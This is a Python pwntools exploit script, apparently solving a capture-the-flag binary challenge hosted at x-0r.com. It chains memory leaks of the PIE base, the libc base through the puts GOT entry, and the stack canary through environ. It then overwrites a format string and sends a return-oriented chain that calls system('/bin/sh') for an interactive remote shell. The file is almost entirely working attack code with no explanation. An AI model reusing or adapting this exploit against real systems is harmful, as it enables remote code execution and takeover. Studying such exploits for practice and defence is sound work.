from pwn import*

context.terminal = 'kitty'
elf = context.binary = ELF('./main')
libc = ELF('./libc.so.6') 
host, port = 'x-0r.com', 5001

gdb_script = f"""
b *main_loop+119
c
"""

def attach_gdb():
        gdb_commands = [cmd.strip() for cmd in gdb_script.strip().split('\n') if cmd.strip()]
        for cmd in gdb_commands:
            gdb_command += ['-ex', cmd]

def start():
    if args.LOCAL:
        io = process('./run_docker.sh')

        sleep(1)

        gdb_command = ["gdb", context.binary.path, "-ex", f"target remote localhost:{port}"]
        
        if args.GDB:
            gdb_commands = [cmd.strip() for cmd in gdb_script.strip().split('\n') if cmd.strip()]
            for cmd in gdb_commands:
                gdb_command += ['-ex', cmd]

        subprocess.Popen([f"{context.terminal[0]}", "--"] + gdb_command)

        return io
    elif args.REMOTE:
        return remote(host, port)
    elif args.GDB:
        return gdb.debug(context.binary.path, gdbscript=gdb_script)
    else:
        return process()

def view(address):
    pause()
    io.sendline(b'1')
    pause()
    io.sendline(str(address).encode())

def patch(address, value):
    pause()
    io.sendline(b'2')
    pause()
    io.sendline(str(address).encode())
    pause()
    io.sendline(str(value).encode())

def leak_pie():
    view("x")
    io.recvuntil(b'Address: ')
    elf.address = int(io.recvuntil(b' ').strip(), 16) - 0x158f
    log.success("base address: " + hex(elf.address))

def leak_libc():
    view(elf.got.puts)
    io.recvuntil(b'Value:')
    libc.address = int(io.recvline().strip(), 16) - 0x80e50
    log.success("libc: " + hex(libc.address))

canary = 0x0
def leak_canary():
    global canary
    view(libc.sym.environ)
    io.recvuntil(b'Value:')
    canary_address = int(io.recvline().strip(), 16) - 0x2400
    io.clean()
    view(canary_address)
    io.recvuntil(b'Value:')
    canary = int(io.recvline().strip(), 16)
    log.success("canary: " + hex(canary))

def override_fmt():
    fmt_address = elf.address + 0x4010
    patch(fmt_address+0x1, ord("s"))

def ropchain():
    ret = elf.address + 0x15c0
    pop_rdi = libc.address + 0x2a3e5
    binsh = next(libc.search(b'/bin/sh\x00'))
    pause()
    payload = b'\x00'
    payload += p64(canary)
    payload += p64(0x0)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(ret)
    payload += p64(libc.sym.system)
    io.sendline(payload)

io = start()
leak_pie()
io.clean()
leak_libc()
io.clean()
leak_canary()
io.clean()
override_fmt()
io.clean()
ropchain()
io.clean()

io.interactive()
